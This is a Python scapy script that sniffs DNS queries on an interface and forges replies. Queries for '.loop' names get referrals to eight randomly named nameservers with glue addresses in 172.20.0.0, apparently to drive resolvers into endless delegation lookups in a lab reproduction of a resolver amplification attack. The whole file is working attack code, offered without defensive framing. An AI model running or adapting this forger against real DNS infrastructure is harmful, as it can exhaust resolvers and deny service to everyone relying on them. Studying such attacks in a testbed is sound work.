#!/usr/bin/env python3
# Import scapy libraries
from scapy.all import *
import string
import random

# Set the interface to listen and respond on
net_interface = "eth0"

# Berkeley Packet Filter for sniffing specific DNS packet only
packet_filter = " and ".join([
    "udp dst port 53",          # Filter UDP port 53
    "udp[10] & 0x80 = 0"       # DNS queries only
    ])

loop_ns = ['172.20.0.64', '172.20.0.65', '172.20.0.66', '172.20.0.67', \
    '172.20.0.68', '172.20.0.69', '172.20.0.70', '172.20.0.71']

# Function that replies to DNS query
def dns_reply(packet):

    # Construct the DNS packet
    # Construct the Ethernet header by looking at the sniffed packet
    eth = Ether(
        src=packet[Ether].dst,
        dst=packet[Ether].src
        )

    # Construct the IP header by looking at the sniffed packet
    ip = IP(
        src=packet[IP].dst,
        dst=packet[IP].src
        )

    # Construct the UDP header by looking at the sniffed packet
    udp = UDP(
        dport=packet[UDP].sport,
        sport=packet[UDP].dport
        )

    random_domain_list = []
    for i in range(0,8):
        letters = string.ascii_lowercase
        random_string = ( ''.join(random.choice(letters) for i in range(10)) )
        random_domain = random_string + '.loop.'
        random_domain_list.append('ns01.' + random_domain)
        
    original_domain_tmp = (str(packet[DNS].qd.qname).split('.')[1:-1])
    original_domain = ('.'.join(original_domain_tmp) + '.')
    
    # Construct the DNS response by looking at the sniffed packet and manually
    if packet[DNS].qd.qtype == 1 and '.loop' in str(packet[DNS].qd.qname):
        dns = DNS(
            id=packet[DNS].id,
            qd=packet[DNS].qd,
            aa=0,
            rd=0,
            qr=1,
            rcode=0,
            qdcount=1,
            ancount=0,
            nscount=8,
            arcount=9,
            ns=DNSRR(
                rrname=original_domain,
                type='NS',ttl=1800,
                rdata=random_domain_list[0])/
               DNSRR(
                rrname=original_domain,
                type='NS',ttl=1800,
                rdata=random_domain_list[1])/
               DNSRR(
                rrname=original_domain,
                type='NS',ttl=1800,
                rdata=random_domain_list[2])/
               DNSRR(
                rrname=original_domain,
                type='NS',ttl=1800,
                rdata=random_domain_list[3])/
               DNSRR(
                rrname=original_domain,
                type='NS',ttl=1800,
                rdata=random_domain_list[4])/
               DNSRR(
                rrname=original_domain,
                type='NS',ttl=1800,
                rdata=random_domain_list[5])/
               DNSRR(
                rrname=original_domain,
                type='NS',ttl=1800,
                rdata=random_domain_list[6])/
               DNSRR(
                rrname=original_domain,
                type='NS',ttl=1800,
                rdata=random_domain_list[7]),
            ar=DNSRR(
                rrname=random_domain_list[0],
                type='A',
                ttl=1800,
                rdata=loop_ns[0])/
               DNSRR(
                rrname=random_domain_list[1],
                type='A',
                ttl=1800,
                rdata=loop_ns[1])/
               DNSRR(
                rrname=random_domain_list[2],
                type='A',
                ttl=1800,
                rdata=loop_ns[2])/
               DNSRR(
                rrname=random_domain_list[3],
                type='A',
                ttl=1800,
                rdata=loop_ns[3])/
               DNSRR(
                rrname=random_domain_list[4],
                type='A',
                ttl=1800,
                rdata=loop_ns[4])/
               DNSRR(
                rrname=random_domain_list[5],
                type='A',
                ttl=1800,
                rdata=loop_ns[5])/
               DNSRR(
                rrname=random_domain_list[6],
                type='A',
                ttl=1800,
                rdata=loop_ns[6])/
               DNSRR(
                rrname=random_domain_list[7],
                type='A',
                ttl=1800,
                rdata=loop_ns[7])/
              DNSRROPT(rclass=1232, z=0, rdlen=0),
        )
        response_packet = eth / ip / udp / dns
        sendp(response_packet, iface=net_interface)
    else:
        dns = DNS(
            id=packet[DNS].id,
            qd=packet[DNS].qd,
            aa=0,
            rd=0,
            qr=1,
            rcode=0,
            qdcount=1,
            ancount=0,
            nscount=0,
            arcount=0,
            )
        response_packet = eth / ip / udp / dns
        sendp(response_packet, iface=net_interface)
            
# Sniff for a DNS query matching the 'packet_filter' and send a specially crafted reply
sniff(filter='udp and dst port 53', iface='eth0', store=0, prn=dns_reply)

